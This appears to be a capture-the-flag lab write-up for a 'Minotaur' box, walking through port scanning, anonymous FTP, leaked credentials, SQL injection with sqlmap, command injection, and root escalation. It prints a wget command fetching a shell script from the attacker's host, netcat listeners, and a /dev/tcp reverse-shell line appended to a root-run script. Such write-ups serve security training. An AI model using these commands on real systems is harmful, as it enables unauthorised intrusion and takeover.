At first an initial scan with rustscan:

rustscan -a 10.10.139.83 --ulimit 5000

shows 4 ports open

PICTURE_RUSTSCAN

After that, let's throw nmap at it:

nmap -sV -sC 10.10.139.83

PIC_NMAP

While ffuf is doing its thing, I'll take a look at the ftp which allows anonymous login..

In the ftp directories is some stuff, it looks like:

PIC_FTP1

Let's explore :)
PIC_FTP2

Aaaand we got the fist flag!!!

While ffuf is still running, I'm going to take a look at the website:

PIC_WEB1

No matter what I typed in, there seems to happen no response what so ever. Let's take a look at the source:
(The hyperlinks are not what they seem, but I made a trip to Twitter, lol)

The source code reveals:

PIC_WEB2

A look at "view-source:http://10.10.139.83/js/login.js" also reveals nothing of value..

In the meantime ffuf managed to get done:

PIC_FFUF

Going quickly through the directories, we can find something interesting in the logs directory.
It looks like a captured Burp request which reveals credentials.
---------------------------------------------------------------------------------
POST /minotaur/minotaur-box/login.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 36
sec-ch-ua: "Chromium";v="93", " Not;A Brand";v="99"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/minotaur/minotaur-box/login.html
Accept-Encoding: gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=8co2rbqdli7itj8f566c61nkhv
Connection: close

email=<hidden>&password=<hidden>

---------------------------------------------------------------------------------

Because I got no response from the login, I turned to the ftp with these very creds, but this trip led to nowhere..
Out of pure desperateness, I turned to the login page again, and got lucky :)

PIC_LANDING1

So far we have two names: Daedalus and Minotaur. Plus we can appearantly search for people and creatures.
Let's do that.
PIC_LANDING2

Seems to be some kind of database thingy.. Let's catch the request with Burp and let sqlmap deal with the heavy load.

sqlmap -r req_master.txt --dbs --batch --time-sec=3

And we get something:

PIC_SQLMAP1

Dump it:

PIC_SQLMAP2


PIC_SQLMAP3


As the newly found user with admin rights is in the same table as Daedalus, with whom we were able to login 
before, let's if we get in with these creds, after a short trip to Crackstation (https://crackstation.net)..

After we log in, we can find the flag in the upper left corner of the site. Besides that, there is a
hyperlink "Secret_Stuff". That sounds interesting enough to follow that.

PIC_LANDING3

Which leads to the "secret echo panel". There we can input stuff and it gets reflected on the page. Twice. 
No matter what I was trying in regards to command injection, it didn't get me command execution. 
This site led me finally to using backticks, instead of quotation marks.
https://book.hacktricks.xyz/pentesting-web/command-injection

PIC_RCE1

So we got rce, let's explore that. And we can find flag3 in the user home directorywhich we can read.
PIC_RCE1

Let's get a shell then. I had to try a few things which led me to:

`/usr/bin/wget <IP>/rev.txt -O /tmp/rev.sh`
Content:
PIC_REV1
Set up a local server to serve the shell
python3 -m http.server 80

Then set up a listener 
nc -lnvp 9001
and execute the freshly downloaded reverse shell on the target:
`bash /tmp/rev.sh`

PIC_REV2

After running linpeash and searching around for a bit, I got a tip. There's a file in the root directory
that we can write to. Plus it is owned by root.. So let's abuse that and pack a rev-shell 
in that very file :)

PIC_REV3

echo 'sh -i >& /dev/tcp/<IP>/6666 0>&1' >> timer.sh

Start another listener and it will connect without any further doing. Now you're root _tataaaa_
So let's go and get the final flag in the /root directory:

PIC_FINAL











































